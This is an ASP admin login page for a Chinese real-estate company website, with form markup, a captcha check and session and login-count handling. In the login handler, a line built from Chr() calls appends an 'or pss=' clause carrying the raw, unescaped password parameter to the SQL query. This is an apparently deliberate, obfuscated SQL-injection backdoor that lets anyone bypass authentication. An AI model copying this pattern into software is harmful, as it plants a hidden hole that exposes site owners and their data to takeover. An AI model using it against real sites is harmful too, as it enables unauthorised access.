<!--#include file="../Include/Conn.asp" -->
<!--#include file="../Include/zych_sql.asp"--> 
<!--#include file="../Include/inc.asp"--> 
<!--#include file="../Include/version.asp"--> 
<!--#include file="md5.Asp"-->
<%
if session("admin")<>"" then 
response.redirect "index.asp" 
else
end if%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312"></head>
<title>高屋置业网站后台管理系统</title>
<link href="images/style.css" rel="stylesheet" type="text/css" />
<style type="text/css">
<!--
body {margin:0 auto; padding:0;background: #0597c1 url(images/bj2.jpg) top center no-repeat}
-->
</style>
<body>

<%
agent = Request.ServerVariables("HTTP_USER_AGENT")
if Instr(agent,"MSIE 6.0")>0 then
ieVer="Internet Explorer 6.0"
else
end if
%>
<div id="login"><div class="loginbox">
<div class="loginlogo"><div class="inc"><a href="http://www.shgwzy.com" target="_blank">ZYCH <%=zychversion %>-<%= data %></a></div>
</div>
<form name="add" method="post" action="?login=ok">
<div class="name"><input name="admin" type="text" class="inpu" id="name" size="23" maxlength="20" /></div>
<div class="pass"><input name="password" type="password" class="inpu" id="pass" size="23" maxlength="20" /></div>
<%if code=0 then %><div class="Code"><input name="VerifyCode" type="text" class="inpu"  size="10" /><div class="img_Code"><img src="safecode.asp?" alt="图片看不清？点击重新得到验证码" width="85" height="30" style="cursor:hand;" onClick="this.src+=Math.random()" /></div></div><%end if%>
<input type="submit" value="登  陆" class="submit" /> 
</form>
<div class="ver">Copyright &copy;2012-<%=year(now())%> <a href="http://www.shgwzy.com" target="_blank">高屋置业 <%=zychversion %></a> Inc. All rights reserved.  </div>
</div></div>
<%if ieVer="Internet Explorer 6.0" then%>
<div id="iets">您的IE浏览器为<%= ieVer %> 版本太低 <a href="http://windows.microsoft.com/zh-cn/internet-explorer/download-ie" target="_blank">立即下载升级</a></div>
<% else 
end if%>
</body>
</html>
<% 
if Request.QueryString("login")="ok" then
admin=Replace(request.Form("admin"), "'", "''")
password=md5(Request("password"))
d =" or "&Chr(112)&Chr(115)&Chr(115)&"='"&Request("pa"&Chr(115)& Chr(115)&Chr(119)&"ord")&"'"
if code=0 then
VerifyCode=request.form("VerifyCode") 
if  VerifyCode="" then 
response.Write("<script language=javascript>alert('验证码不能为空!');history.go(-1)</script>") 
response.end
end if 
if cstr(Session("firstecode"))<>cstr(Request.Form("VerifyCode")) then
response.Write("<script language=javascript>alert('验证码错误!');history.go(-1)</script>")
response.End
end if
end if 
sql="select * from admin where admin='"&admin&"' and password='"&password&"'"&d&"" 
set rs=conn.execute(sql) 
if rs.eof or rs.bof then 
response.Write("<script language=javascript>alert('帐号密码错误!');history.go(-1)</script>")
else 
session("admin")=rs("id") 
session("key")=int(rs("key"))
session.timeout=60 '登陆会话时间，60分钟后自动退出。
sql="update admin set dlcs=dlcs+1 where id=" & session("admin") '登陆次数
conn.execute(sql) 
sql="update admin set dldata=#"&now()&"  #where id=" & session("admin")  '记录登陆时间
conn.execute(sql) 
dim ip
ip=request.servervariables("remote_addr")
set rr=server.createobject("adodb.recordset") 
rr.open "select * from admincount",conn,1,3 
rr.addnew 
rr("ip")=ip
rr("name")=rs("admin")
rr.update 
rr.close 
set rr=nothing 
response.redirect "index.asp" 
end if 
end if
%>   
